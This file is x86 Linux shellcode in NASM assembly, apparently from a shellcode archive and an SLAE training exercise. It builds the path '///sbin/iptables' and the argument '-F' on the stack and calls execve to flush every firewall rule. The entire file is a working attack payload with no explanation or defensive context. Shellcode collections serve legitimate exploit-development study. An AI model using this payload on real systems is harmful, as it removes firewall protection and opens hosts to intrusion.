; From: http://shell-storm.org/shellcode/files/shellcode-825.php
; Filename: shellcode3.nasm
; Author:  SLAE-935
;
; Purpose: iptables --flush

section .text

    global _start
 
_start:
    xor eax, eax
    push eax
    push word 0x462d
    mov esi, esp
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f6e6962
    push 0x732f2f2f
    mov ebx, esp
    push eax
    push esi
    push ebx
    mov ecx, esp
    mov edx, eax 
    mov al, 0xb
    int 0x80